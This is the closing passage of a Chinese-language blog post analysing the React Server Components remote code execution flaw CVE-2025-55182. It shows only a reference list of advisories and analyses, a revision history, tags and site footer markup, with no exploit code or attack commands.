</span></span><span class="line"><span class="cl">  <span class="p">}</span>  
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="参考文献" class="heading-element"><span>参考文献</span>
  <a href="#%e5%8f%82%e8%80%83%e6%96%87%e7%8c%ae" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li><a href="https://cloud.tencent.com/announce/detail/2179"target="_blank" rel="external nofollow noopener noreferrer">【安全通告】React Server Components RCE（CVE-2025-55182）</a></li>
<li><a href="https://xz.aliyun.com/news/90754"target="_blank" rel="external nofollow noopener noreferrer">React 框架 CVE-2025-55182 RCE CVSS 10.0分析</a></li>
<li><a href="https://xz.aliyun.com/news/90753"target="_blank" rel="external nofollow noopener noreferrer">React 服务器组件原型链漏洞（CVE-2025-55182）</a></li>
<li><a href="https://keenlab.tencent.com/zh/2025/12/08/2025-CVE-2025-55182/"target="_blank" rel="external nofollow noopener noreferrer">【漏洞分析】CVE-2025-55182 React2shell远程代码执行解析</a></li>
<li><a href="https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3"target="_blank" rel="external nofollow noopener noreferrer">POC for CVE-2025-55182 that works on Next.js 16.0.6</a></li>
<li><a href="https://mp.weixin.qq.com/s/4RY6qo7Oww0Iny9GoxY5dw"target="_blank" rel="external nofollow noopener noreferrer">CVE-2025-55182 Next.js Server Actions RCE Vulnerability Analysis</a></li>
<li><a href="https://xz.aliyun.com/news/90764"target="_blank" rel="external nofollow noopener noreferrer">源码层面详解Node.js反序列化漏洞原理与利用</a></li>
</ul>
<h2 id="文件属性" class="heading-element"><span>文件属性</span>
  <a href="#%e6%96%87%e4%bb%b6%e5%b1%9e%e6%80%a7" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>创建时间：2025-12-05   17:41</p>
<p>修订记录：</p>
<ul>
<li>2025-12-05 ，此次修订内容 | 新建</li>
<li>2026-01-07，V0.5 版本 | 修改</li>
<li>2026-01-16，V1.0 版本 | 新增 Flight协议分析</li>
</ul>
<h2 id="备注" class="heading-element"><span>备注：</span>
  <a href="#%e5%a4%87%e6%b3%a8" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2></div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="更新于 2025-12-05 17:01:05">更新于 2025-12-05&nbsp;</span>
      </div></div><div class="post-info-line">
        <div class="post-info-md"></div>
        <div class="post-info-share">
          <span></span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/draft/" class="post-tag" title="标签 - Draft">Draft</a><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-tag" title="标签 - 漏洞分析">漏洞分析</a><a href="/tags/javascript/" class="post-tag" title="标签 - JavaScript">JavaScript</a><a href="/tags/react/" class="post-tag" title="标签 - React">React</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
    </section>
  </div><div class="post-nav"><a href="/posts/case-003-flash_swf_amf_test/" class="post-nav-item" rel="prev" title="003-渗透案例：记一次Flash网站渗透测试"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>003-渗透案例：记一次Flash网站渗透测试</a><a href="/posts/case-004-sqli-druid_filter/" class="post-nav-item" rel="next" title="004-渗透案例：记一次SQL注入_参数名可控">004-渗透案例：记一次SQL注入_参数名可控<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
    <div class="footer-container"><div class="footer-line visitor">
          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
        </div></div>
    <script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        inlineMath: [['$','$'], ['\\(','\\)']],
        processEscapes: true
      }
    });
</script>

<script src='https://cdn.jsdelivr.net/npm/mathjax@2.7.4/MathJax.js?config=TeX-AMS-MML_HTMLorMML' async></script>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/lightgallery/lightgallery.min.js" defer></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js" defer></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":20},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"lightgallery":true,"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/search.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"twemoji":true,"version":"v0.3.16"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
</html>
